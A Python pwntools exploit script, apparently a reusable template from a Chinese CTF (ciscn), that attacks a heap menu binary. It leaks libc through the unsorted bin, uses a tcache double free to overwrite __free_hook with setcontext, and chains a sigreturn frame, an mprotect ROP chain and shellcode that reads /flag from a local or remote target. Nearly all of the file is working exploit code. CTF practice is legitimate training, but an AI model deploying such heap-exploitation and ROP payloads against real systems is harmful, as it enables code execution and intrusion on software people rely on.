#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./ciscn_nw_4"                                   # 本地ELF
    pro_libc = "libc-2.27_64.so"       # Libc文件
    rem_libc = "libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)

def malloc(size,content):
    ru(">>")
    sl('1')
    ru("?")
    sl(str(size))
    ru("?")
    sl(content)

def delete(idx):
    ru(">>")
    sl('2')
    ru("?")
    sl(str(idx))

def show(idx):
    ru(">>")
    sl('3')
    ru("?")
    sl(str(idx))
    
def exp():
    ru("?")
    sl('Du4t')

    malloc(0x80,'a')
    malloc(0x10,'p')
    for i in range(8):
        delete(0)
    show(0)
    ru("\n")
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    info("libc_base: "+hex(libc_base))
    free_hook=libc_base+libc.symbols['__free_hook']
    info("free_hook: "+hex(free_hook))
    set_context=libc_base+libc.symbols['setcontext']
    info("set_context: "+hex(set_context+53))
    syscall=libc_base+0x00000000000d2975
    info("syscall: "+hex(syscall))
    pop_rax=libc_base+0x00000000000439c8
    pop_rdi=libc_base+0x000000000002155f
    pop_rdx=libc_base+0x0000000000001b96
    pop_rsi=libc_base+0x0000000000023e6a
    jmp_rsp=libc_base+0x0000000000002b1d
    
    malloc(0x68,p64(free_hook))
    delete(2)
    delete(2)

    malloc(0x68,p64(free_hook))
    malloc(0x68,p64(set_context+53))
    malloc(0x68,p64(set_context+53))



    frame=SigreturnFrame(arch='amd64')
    frame.rax=0
    frame.rdi=0
    frame.rsi=free_hook&0xfffffffffffff000
    frame.rdx=0x2000
    frame.rsp=free_hook&0xfffffffffffff000
    frame.rip=syscall
    payload=str(frame)

    malloc(0x100,payload)
    delete(6)

    payload2=p64(pop_rdi)+p64(free_hook&0xfffffffffffff000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)
    payload2+=p64(pop_rax)+p64(10)+p64(syscall)+p64(jmp_rsp)
    shellcode = shellcraft.amd64.open('/flag')
    shellcode += '''
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edi, 1
    mov rsi, rsp
    push 1
    pop rax
    syscall
    '''
    sl(payload2+asm(shellcode,arch="amd64"))

    # debug()



    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

